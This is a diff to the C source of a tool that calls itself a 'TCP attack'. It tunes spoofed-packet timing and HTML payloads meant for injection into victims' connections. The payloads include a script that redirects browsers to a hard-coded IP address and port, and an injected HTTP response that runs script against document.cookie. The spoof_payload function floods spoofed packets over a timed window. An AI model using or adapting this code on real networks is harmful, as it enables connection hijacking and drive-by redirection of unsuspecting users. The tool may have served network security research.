@@ -22,7 +22,8 @@
 
 #define HTML_CODE "<html><h1>Hi</h1>Welcome to my TCP attack! (v0.0.1)\n" \
     "<iframe id=\"foo\" src=\"http://hobocomp.com/\"></iframe>\n" \
-    "<script type=\"text/javascript\">setTimeout(function(){document.location=\"http://141.212.111.247:888/\";},200);</script></html>"
+    "<script type=\"text/javascript\">setTimeout(function(){" \
+    "document.location=\"http://141.212.111.247:888/\";},250);</script></html>"
 
 #define INJECT_HTTP "HTTP/1.1 200\nContent-Type: text/html;\n\n<script>alert(document.cookie);</script>\n"
 #define INJECT_SIZE 1024
@@ -89,7 +90,7 @@ void spoof_payload(struct sockaddr_in *sin, uint32_t seq_start)
         pkt_count++;
         gettimeofday(&cur_time, NULL);
     } while (((cur_time.tv_sec - start_time.tv_sec)*1000 - 
-              (cur_time.tv_usec - start_time.tv_usec)/1000) < 1000);
+              (cur_time.tv_usec - start_time.tv_usec)/1000) < 250);
     printf("got %d packets off\n", pkt_count); 
 }
 
